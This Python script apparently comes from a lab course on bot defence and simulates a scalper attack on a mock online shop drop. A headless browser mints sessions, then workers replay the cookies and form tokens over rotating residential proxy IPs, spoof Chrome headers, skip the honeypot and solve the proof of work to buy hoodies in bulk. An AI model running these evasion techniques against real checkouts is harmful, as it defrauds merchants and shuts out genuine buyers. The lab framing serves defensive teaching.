"""
W1 Ch9 — Wave 3: session minting and handoff (beats Round 3).

The attacker read W1 Ch5 and W1 Ch8. Form fillers die on the honeypot and
the JS cookie, so let a real browser do the parts that need a browser,
once, and let cheap scripts do the rest:

  1. MINT. A headless Chromium (consistent headers via browser_kit) opens
     the home page and the product page on a residential IP. The page
     script sets js_ok; the server records that the form was served. The
     attacker keeps the cookies and the form, and closes the browser.
  2. SPEND. Plain requests workers submit ONLY the visible fields (the
     honeypot stays empty), with the same Chrome headers, through the
     proxy network's cheap rotating mode: a new residential IP for every
     request. Each minted session buys up to 5 hoodies.

One browser launch, many purchases: that is the economics this wave
depends on. If the page carries a proof of work, the workers solve it in
Python (W1 Ch7 showed native code is faster than any browser).

Expected (tools/checkpoint.py):
  Round 3  takes most of the drop: every session signal is genuine
  Round 4  stopped: one hoodie per session kills the reuse, and the proof
           of work is bound to the network it was issued on, so a worker
           on a rotating IP can't spend it (asn_changed raises the price too)

Needs a browser: playwright install chromium

    python attacks/wave3_session_minting.py
"""

import asyncio
import hashlib
import json
import os
import random
import sys
import threading
import time
from collections import Counter

from playwright.async_api import async_playwright

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
from browser_kit import MAJOR, new_page  # noqa: E402
from browsers import chrome  # noqa: E402
from labnet import BASE_URL, LabClient, form_fields, pow_bits, world_pool  # noqa: E402

SESSIONS = 6         # browser sessions to mint
MINTERS = 6          # browser contexts minting in parallel
PER_SESSION = 5      # hoodies each minted session should buy
WORKERS = 6


async def mint(pool, rng):
    minted, started = [], time.perf_counter()
    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        sem = asyncio.Semaphore(MINTERS)

        async def one():
            async with sem:
                context, page = await new_page(browser, rng.choice(pool), "bot:wave3")
                try:
                    await page.goto(BASE_URL + "/")
                    await page.click("a[href='/drop']")
                    await page.wait_for_selector("#checkout", timeout=10000)
                    await page.wait_for_timeout(1100)          # let the form "age" past MIN_FORM_SECONDS
                    cookies = {c["name"]: c["value"] for c in await context.cookies()}
                    minted.append({"cookies": cookies, "html": await page.content()})
                except Exception:
                    pass                                        # blocked or broken: one less session
                finally:
                    await context.close()

        await asyncio.gather(*(one() for _ in range(SESSIONS)))
        await browser.close()
    return minted, time.perf_counter() - started


def solve(challenge, bits):
    prefix, counter, target = f"{challenge}:".encode(), 0, 1 << (256 - bits)
    while int.from_bytes(hashlib.sha256(prefix + str(counter).encode()).digest(), "big") >= target:
        counter += 1
    return counter


def spend(minted, pool):
    lock, sold_out = threading.Lock(), threading.Event()
    totals = {"believed": 0, "requests": 0, "statuses": Counter(), "pow_seconds": 0.0}
    jobs = list(enumerate(minted))

    def worker():
        while not sold_out.is_set():
            with lock:
                if not jobs:
                    return
                i, session = jobs.pop(0)
            shop = LabClient("bot:wave3", pool=pool)          # rotating residential IP per request
            for name in ("sid", "js_ok"):
                if name in session["cookies"]:
                    shop.set_cookie(name, session["cookies"][name])
            html, bought, pow_s = session["html"], 0, 0.0
            for n in range(PER_SESSION * 3):                   # a few retries per hoodie
                if bought >= PER_SESSION or sold_out.is_set():
                    break
                fields = form_fields(html)
                data = {"csrf": fields.get("csrf", ""), "email": f"mint{i}.{n}@scalp.example", "size": "M"}
                if "pow_challenge" in fields:
                    t = time.perf_counter()
                    data["pow_challenge"] = fields["pow_challenge"]
                    data["pow_counter"] = solve(fields["pow_challenge"], pow_bits(html))
                    pow_s += time.perf_counter() - t
                r = shop.post("/checkout", data, chrome(MAJOR, "windows", "post", BASE_URL, BASE_URL + "/drop"))
                if r.status_code == 200 and "Order" in r.text:
                    bought += 1
                elif r.status_code == 401:
                    html = r.text                              # a fresh challenge: try again
                elif r.status_code == 410:
                    sold_out.set()
                else:
                    break                                      # blocked, over the cap, or form expired
            with lock:
                totals["believed"] += bought
                totals["requests"] += shop.requests
                totals["statuses"].update(shop.statuses)
                totals["pow_seconds"] += pow_s

    threads = [threading.Thread(target=worker) for _ in range(WORKERS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return totals


def run(seed=3):
    pool = world_pool("residential_proxy")
    minted, mint_seconds = asyncio.run(mint(pool, random.Random(seed)))
    totals = spend(minted, pool)
    return {"wave": "wave3", "believed": totals["believed"], "requests": totals["requests"] + 2 * SESSIONS,
            "statuses": dict(totals["statuses"]), "pow_seconds": round(totals["pow_seconds"], 2),
            "browser_sessions": len(minted), "mint_seconds": round(mint_seconds, 1)}


if __name__ == '__main__':
    result = run()
    if "--json" in sys.argv:
        print(json.dumps(result))
    else:
        print(f"=== Wave 3: {result['browser_sessions']} minted sessions, rotating workers ===\n"
              f"  believes it bought {result['believed']} hoodies · minting took {result['mint_seconds']}s · "
              f"PoW {result['pow_seconds']}s · statuses {result['statuses']}")
